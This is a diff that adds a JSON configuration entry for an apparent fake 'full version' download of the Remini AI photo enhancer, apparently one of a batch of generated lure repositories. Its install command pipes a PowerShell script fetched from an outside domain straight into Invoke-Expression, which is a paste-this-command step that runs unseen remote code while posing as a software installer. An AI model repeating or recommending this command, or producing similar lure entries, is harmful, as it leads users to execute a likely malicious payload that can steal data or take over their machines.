@@ -1,0 +1,24 @@
+{
+  "repo": "Remini-AI-Photo-Enhancer-Pro-Desktop-Full-Version",
+  "product": "Remini AI Photo Enhancer Pro Desktop Full Version",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "ai",
+  "topics": [
+    "remini-ai-photo-enhancer-pro-desktop-ful",
+    "remini",
+    "photo",
+    "enhancer",
+    "pro",
+    "desktop",
+    "full",
+    "windows",
+    "setup-guide",
+    "software",
+    "productivity"
+  ]
+}
